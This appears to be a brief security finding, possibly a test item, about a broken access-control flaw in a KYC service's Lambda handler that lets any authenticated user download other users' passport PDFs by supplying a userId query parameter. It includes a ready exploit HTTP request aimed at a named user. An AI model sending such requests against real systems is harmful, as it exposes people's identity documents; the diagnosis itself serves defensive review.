diagnosis: The Lambda handler extracts targetUserId by prioritizing event.queryStringParameters.userId over the API Gateway custom authorizer context (event.requestContext.authorizer.userId). Any authenticated user can append ?userId=target_user to download other users' passport PDFs.
exploit_request:
GET /identity/passport?userId=usr_ceo_4011 HTTP/1.1
Host: kyc.fintech.io
Authorization: Bearer <attacker_token>
